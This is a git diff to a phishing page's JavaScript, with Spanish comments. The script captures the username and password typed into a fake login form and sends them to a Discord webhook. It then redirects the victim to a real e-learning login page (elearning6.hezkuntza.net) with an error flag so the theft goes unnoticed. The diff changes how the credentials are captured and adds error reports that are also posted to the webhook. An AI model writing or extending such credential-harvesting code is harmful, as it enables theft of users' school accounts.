@@ -1,10 +1,14 @@
 document.addEventListener('DOMContentLoaded', function() {
     const form = document.getElementById('login');
-    if(form){
-        form.addEventListener('submit', function(event) {
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const loginBtn = document.getElementById('loginbtn');
+
+    if (form && usernameInput && passwordInput && loginBtn) {
+        loginBtn.addEventListener('click', function(event) {
             event.preventDefault();
-            const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+            const username = usernameInput.value;
+            const password = passwordInput.value;
             // Construye el objeto con los datos del usuario
             const userData = {
                 username: username,
@@ -12,7 +16,6 @@ document.addEventListener('DOMContentLoaded', function() {
             };
             // Envía los datos al webhook de Discord
             enviarDatosDiscord(userData);
-            // Aquí puedes agregar más lógica, como redirigir a otra página
         });
     }
 
@@ -53,7 +56,27 @@ document.addEventListener('DOMContentLoaded', function() {
             window.location.href = 'https://elearning6.hezkuntza.net/012982/login/index.php?loginerror=1';
         })
         .catch(error => {
-            console.error('Error:', error);
+            console.error('Error al enviar los datos al webhook de Discord:', error);
+            // En caso de error, envía un mensaje al webhook indicando el problema
+            const errorMessage = {
+                content: 'Hubo un problema al enviar los datos del formulario de inicio de sesión a Discord.'
+            };
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(errorMessage)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Error al enviar el mensaje de error al webhook de Discord');
+                }
+                console.log('Mensaje de error enviado exitosamente al webhook de Discord');
+            })
+            .catch(error => {
+                console.error('Error al enviar el mensaje de error al webhook de Discord:', error);
+            });
         });
     }
 });
